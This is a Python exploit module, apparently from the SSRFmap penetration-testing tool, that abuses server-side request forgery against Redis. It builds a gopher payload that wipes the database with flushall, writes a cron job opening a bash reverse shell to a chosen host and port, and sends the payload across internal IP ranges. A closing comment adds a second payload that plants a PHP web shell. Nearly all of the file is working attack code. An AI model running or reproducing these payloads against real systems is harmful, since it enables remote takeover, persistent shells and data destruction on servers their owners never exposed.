from ssrfmap.core.utils import *
import logging

name        = "redis"
description = "Redis RCE - Crontab reverse shell"
author      = "Swissky"
documentation = [
    "https://maxchadwick.xyz/blog/ssrf-exploits-against-redis",
    "http://vinc.top/2016/11/24/server-side-request-forgery/"
    ]

class exploit():
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"
    SERVER_CRON = "/var/lib/redis"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Handle args for reverse shell
        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
        else:                  self.SERVER_HOST = args.lhost

        if args.lport == None: self.SERVER_PORT = input("Server Port:")
        else:                  self.SERVER_PORT = args.lport

        self.SERVER_CRON = input("Server Cron (e.g:/var/spool/cron/):")
        self.LENGTH_PAYLOAD = 65 - len("SERVER_HOST") - len("SERVER_PORT")
        self.LENGTH_PAYLOAD = self.LENGTH_PAYLOAD + len(str(self.SERVER_HOST))
        self.LENGTH_PAYLOAD = self.LENGTH_PAYLOAD + len(str(self.SERVER_PORT))

        # Using a generator to create the host list
        # Edit the following ip if you need to target something else
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:

            # Data and port for the service
            port = "6379"
            data = "*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$LENGTH_PAYLOAD%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/SERVER_HOST/SERVER_PORT%200>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0aSERVER_CRON%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
            payload = wrapper_gopher(data, ip , port)

            # Handle args for reverse shell
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)
            payload = payload.replace("SERVER_CRON", self.SERVER_CRON)
            payload = payload.replace("LENGTH_PAYLOAD", str(self.LENGTH_PAYLOAD))

            if args.verbose == True:
                logging.info("Generated payload : {}".format(payload))
                
            # Send the payload
            r = requester.do_request(args.param, payload)

            if args.verbose == True:
                logging.info("Module '{}' ended !".format(name))

"""
TODO:
This exploit only works if you have control over a cron file.
Command execution via PHP file is not implemented, a simple example is the following.
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT
"""